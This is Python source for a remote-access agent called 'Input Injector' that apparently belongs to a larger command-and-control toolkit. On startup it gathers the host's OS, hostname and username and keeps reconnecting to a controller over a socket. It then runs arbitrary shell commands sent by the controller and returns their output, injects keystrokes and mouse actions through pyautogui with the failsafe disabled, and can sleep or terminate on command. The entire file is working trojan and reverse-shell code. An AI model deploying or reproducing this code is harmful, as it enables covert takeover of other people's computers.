import socket, pickle, pyautogui, os, subprocess
from platform import platform
from getpass import getuser
from time import sleep

port = 9999
ip_addr = '127.0.0.1'
type_of_scout = 'Input Injector'
server_key = 'LdtwGvWUNeuRqrxCjpMyFEhnOPsISzBbTfQKVAZkDiomlJHgcX'
End = 'vfyNAiIeoLbExRYCMWzJtXqcDFZlrapVTKgBmUshSjPkGQHdnu'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [server_key, userinfo, type_of_scout, operating_sys]
shell_type = '/bin/bash'
s = None
pyautogui.FAILSAFE = False

valid_keys = ['\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
              ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
              '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
              'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
              'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
              'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
              'browserback', 'browserfavorites', 'browserforward', 'browserhome',
              'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
              'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
              'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
              'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
              'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
              'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
              'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
              'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
              'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
              'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
              'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
              'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
              'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
              'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
              'command', 'option', 'optionleft', 'optionright']

help_menu = '''\nInput Injector  Menu
====================

   Global Commands :
      banner                            Display a banner
      help                              Show the help menu
      quit                              Quit the console
      clear                             Clear the screen

   Command Shell Commands :
      exec <shell command>              Executes shell command and returns output
      swap <shell path>                 Switch the type of shell used, default is "/bin/bash"

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill tbe scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Key Injection commands :
      pr <key>                          Press a key
      sh <keys separated with spaces>   Use a keyboard shortcut
      ty <string>                       Type out a string
      valids                            Show all valid keys to use on target

   Mouse Injection commands :
      click_left                        Click the left mouse button
      click_right                       Click the right mouse button
      move_to <X cord> <Y cord>         Move mouse to XY coordinates on screen

   Screen command :
      dimensions                        Get the dimensions/size of screen in terms of XY
      position                          Get current mouse position on screen in terms of XY coordinates\n'''

def recvall(the_socket):
    total_data = []
    while True:
        data = the_socket.recv(8192)
        if End in data:
            total_data.append(data[:data.find(End)])
            break
        total_data.append(data)
        if len(total_data) > 1:
            last_pair = total_data[-2] + total_data[-1]
            if End in last_pair:
                total_data[-2] = last_pair[:last_pair.find(End)]
                total_data.pop()
                break
    return ''.join(total_data)

def shell_execute(execute):
    if execute[:3] == 'cd ':
        try:
            execute = execute.replace('cd ', '')
            os.chdir(execute)
            s.sendall("[+]Changed to directory : " + execute + End)
        except:
            s.sendall('[-]Could not change to directory : ' + execute + End)
    else:
        try:
            result = subprocess.Popen(execute, shell=True, executable=shell_type, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            try:
                s.sendall(unicode(result + End))
            except:
                s.sendall(result + End)
        except:
            s.sendall('[-]Could not execute command' + End)

def inject_input(injection_type, arg):
    try:
        if injection_type == 'ty':
            pyautogui.typewrite(arg)
            s.sendall('[+]Injected typewritten character/s' + End)
        elif injection_type == 'pr':
            pyautogui.press(arg)
            s.sendall('[+]Injected pressed key' + End)
        elif injection_type == 'sh':
            if ' ' in arg:
                arg = arg.split(' ')
                for key in arg:
                    pyautogui.keyDown(key)
                for key in reversed(arg):
                    pyautogui.keyUp(key)
                s.sendall('[+]Injected keyboard shortcut' + End)
            else:
                pyautogui.hotkey(arg)
                s.sendall('[+]Injected keyboard shortcut' + End)
        elif injection_type == 'valids':
            tar_list = '|/'.join(valid_keys)
            s.sendall(tar_list + End)
        elif injection_type == 'click_left':
            pyautogui.click(button='left')
            s.sendall('[+]Injected left mouse click' + End)
        elif injection_type == 'click_right':
            pyautogui.click(button='right')
            s.sendall('[+]Injected right mouse click' + End)
        elif injection_type == 'move_to':
            try:
                arg = arg.split(' ')
                cord_one = int(arg[0])
                cord_two = int(arg[1])
                pyautogui.moveTo(x=cord_one, y=cord_two)
                s.sendall('[+]Injected mouse movement' + End)
            except:
                s.sendall('[-]Input X and Y coordinates as integers' + End)
                return
        elif injection_type == 'dimensions':
            dimensions = pyautogui.size()
            dimensions = '[+]Dimensions of screen : ' + str(dimensions[0]) + ' x ' + str(dimensions[1])
            s.sendall(dimensions + End)
        elif injection_type == 'position':
            current = pyautogui.position()
            current = '[+]Current mouse position : ' + str(current[0]) + ' x ' + str(current[1])
            s.sendall(current + End)
        else:
            s.sendall('[-]Unknown command "' + injection_type + '", run "help" for help menu' + End)
    except Exception as e:
        s.sendall('[-]Error injecting keystrokes : ' + str(e))


def main():
    global s, shell_type
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except:
                sleep(30)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                data = recvall(s)
                command = data.split(' ', 1)[0]
                if command == 'help':
                    s.sendall(help_menu+End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data.split(' ')[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    sleep(sleep_time)
                    break
                elif command == 'exec':
                    try:
                        execute = data.split(' ',1)[1]
                    except:
                        s.sendall('[-]Specify a command to execute' + End)
                        continue
                    shell_execute(execute)
                elif command == 'swap':
                    try:
                        shell_type = data.split(' ',1)[1]
                        s.sendall('[+]Current shell in use is : '+shell_type+End)
                    except:
                        s.sendall('[-]Specify a shell type'+End)
                else:
                    arg = data.split(' ', 1)
                    if len(arg) > 1:
                        inject_input(command, arg[1])
                    else:
                        inject_input(command, None)
            except:
                s.shutdown(1)
                s.close()
                break


main()
